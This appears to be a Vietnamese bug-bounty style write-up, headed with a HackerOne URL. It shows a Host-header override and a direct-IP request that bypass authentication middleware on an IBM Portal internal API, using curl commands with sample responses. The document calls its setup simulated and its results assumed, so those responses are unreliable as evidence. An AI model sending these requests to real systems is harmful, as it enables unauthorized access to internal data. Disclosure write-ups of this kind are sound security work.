# https://hackerone.com/reports/3088290

**Vượt qua xác thực middleware trên IBM Portal**

---

## Môi trường giả lập

* **Target**: IBM Portal, có endpoint nội bộ nằm sau middleware Auth.
* **User**: chưa auth (không có token hoặc cookie hợp lệ).
* **Công cụ**: `curl` hoặc Burp Suite để chỉnh header.

---

## Bước 1: Xác định endpoint bị bảo vệ

Giả sử endpoint nhạy cảm là:

```
GET https://portal.ibm.com/api/v1/internal/status
```

Thông thường, nếu không auth, server sẽ trả về **401 Unauthorized**.

```bash
curl -i "https://portal.ibm.com/api/v1/internal/status"
```

```http
HTTP/2 401 Unauthorized
WWW-Authenticate: Bearer realm="IBM Portal"
…
```

---

## Bước 2: Bypass bằng cách override Host header

Middleware Auth chỉ áp dụng cho hostname công khai `portal.ibm.com`, còn nội bộ có hostname khác (vd. `internal-api.ibm.com`) thì không chạy qua middleware đó. Ta lợi dụng bằng cách:

```bash
curl -i "https://portal.ibm.com/api/v1/internal/status" \
  -H "Host: internal-api.ibm.com" \
  -H "Accept: application/json"
```

**Kết quả**: Server vẫn trả về **200 OK** cùng dữ liệu nhạy cảm, dù ta không cung cấp token nào.

```http
HTTP/2 200 OK
Content-Type: application/json

{
  "status": "ok",
  "uptime": "10234h",
  "build": "v3.5.2-internal",
  "secrets": { … }
}
```

> Đây chính là bypass: request đã đi thẳng đến service nội bộ mà không qua kiểm tra Auth của middleware.

---

## Bước 3: Bypass qua IP trực tiếp

Một biến thể nữa, nếu biết IP của LB/backend, ta có thể gọi thẳng:

```bash
curl -i "https://192.0.2.123/api/v1/internal/status" \
  -H "Host: internal-api.ibm.com"
```

Kết quả tương tự: **200 OK**.

---

## Impact

* Kẻ tấn công **truy cập hoàn toàn** vào API nội bộ chứa thông tin nhạy cảm.
* Có thể đọc config, build info, thậm chí secrets nếu endpoint cho phép.
* Đánh mất tính bảo mật toàn cục, mở đường cho command injection, RCE…

---

